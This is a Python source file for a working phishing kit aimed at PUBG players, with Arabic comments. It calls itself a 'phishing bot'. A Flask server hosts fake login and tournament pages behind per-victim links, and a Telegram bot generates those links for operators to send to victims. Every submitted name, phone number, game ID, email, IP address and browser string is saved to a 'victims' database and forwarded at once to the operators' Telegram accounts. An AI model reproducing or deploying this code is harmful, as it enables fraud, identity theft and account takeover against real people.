#!/usr/bin/env python3
import os
import json
import sqlite3
import secrets
import threading
import requests
from datetime import datetime
from flask import Flask, request, render_template, redirect, jsonify
from telegram import Bot
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== الإعدادات ==========
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_IDS = [int(id.strip()) for id in os.environ.get("ADMIN_IDS", "").split(",") if id.strip()]
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN not set")

# ========== Flask ==========
app = Flask(__name__)

# ========== قاعدة البيانات ==========
DB_PATH = "data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT UNIQUE,
        step TEXT,
        full_name TEXT,
        phone_code TEXT,
        phone_number TEXT,
        game_id TEXT,
        email TEXT,
        ip TEXT,
        user_agent TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
                 (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, user_agent, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    # إرسال البيانات فوراً للتيليجرام
    try:
        bot = Bot(token=TELEGRAM_TOKEN)
        msg = (f"🎯 **بيانات جديدة!**\n"
               f"🆔 الجلسة: `{session_id}`\n"
               f"👤 الاسم: `{full_name}`\n"
               f"📞 الهاتف: `{phone_code}{phone_number}`\n"
               f"🎮 ID اللعبة: `{game_id}`\n"
               f"📧 البريد: `{email}`\n"
               f"🌐 IP: `{ip}`\n"
               f"📱 المتصفح: `{ua}`\n"
               f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}")
        for admin_id in ADMIN_IDS:
            bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
    except Exception as e:
        print(f"[!] خطأ في الإرسال للتيليجرام: {e}")

# ========== الصفحات ==========
@app.route('/')
def home():
    return "🚀 البوت يعمل!"

@app.route('/health')
def health():
    return "OK", 200

@app.route('/p/<session_id>', methods=['GET', 'POST'])
def login_page(session_id):
    if request.method == 'POST':
        return redirect(f'/t/{session_id}')
    return render_template('login.html', session_id=session_id)

@app.route('/t/<session_id>', methods=['GET', 'POST'])
def tournament_page(session_id):
    if request.method == 'POST':
        full_name = request.form.get('full_name', '').strip()
        phone_code = request.form.get('phone_code', '')
        phone_number = request.form.get('phone_number', '').strip()
        game_id = request.form.get('game_id', '').strip()
        email = request.form.get('email', '').strip()
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        save_victim(session_id, 'completed', full_name, phone_code, phone_number, game_id, email, ip, ua)
        return render_template('thank_you.html')
    return render_template('tournament.html', session_id=session_id)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    session_id = data.get('session_id')
    full_name = data.get('full_name', '')
    phone_code = data.get('phone_code', '')
    phone_number = data.get('phone_number', '')
    game_id = data.get('game_id', '')
    email = data.get('email', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    save_victim(session_id, 'ajax', full_name, phone_code, phone_number, game_id, email, ip, ua)
    return jsonify({"status": "ok"})

# ========== دوال البوت ==========
async def start(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ غير مصرح لك.")
        return
    await update.message.reply_text(
        "🔥 **بوت تصيد ببجي v1.0**\n\n"
        "**الأوامر:**\n"
        "/link - إنشاء رابط تصيد جديد\n"
        "/list - عرض الضحايا\n"
        "/stats - إحصائيات",
        parse_mode='Markdown'
    )

async def generate_link(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        return
    session_id = secrets.token_urlsafe(8)
    link = f"{BASE_URL}/p/{session_id}"
    await update.message.reply_text(
        f"🔗 **رابط جديد**\n\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"🔗 الرابط: {link}\n\n"
        f"📤 شارك الرابط مع الضحية.",
        parse_mode='Markdown'
    )

async def list_victims(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, full_name, phone_number, game_id, email, timestamp FROM victims ORDER BY id DESC LIMIT 10")
    data = c.fetchall()
    conn.close()
    if not data:
        await update.message.reply_text("📭 لا يوجد ضحايا.")
        return
    msg = "📋 **الضحايا:**\n\n"
    for v in data:
        msg += f"🆔 `{v[0]}` | 👤 {v[1]} | 📞 {v[2]} | 🎮 {v[3]} | 📧 {v[4]} | 📅 {v[5]}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def stats(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims")
    total = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(
        f"📊 **إحصائيات**\n\n"
        f"👤 إجمالي الضحايا: `{total}`",
        parse_mode='Markdown'
    )

# ========== تشغيل البوت في خلفية منفصلة ==========
def run_bot():
    app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("link", generate_link))
    app_bot.add_handler(CommandHandler("list", list_victims))
    app_bot.add_handler(CommandHandler("stats", stats))
    app_bot.run_polling()

# ========== المدخل الرئيسي ==========
if __name__ == "__main__":
    init_db()
    
    # تشغيل البوت في خيط منفصل
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # تشغيل Flask
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
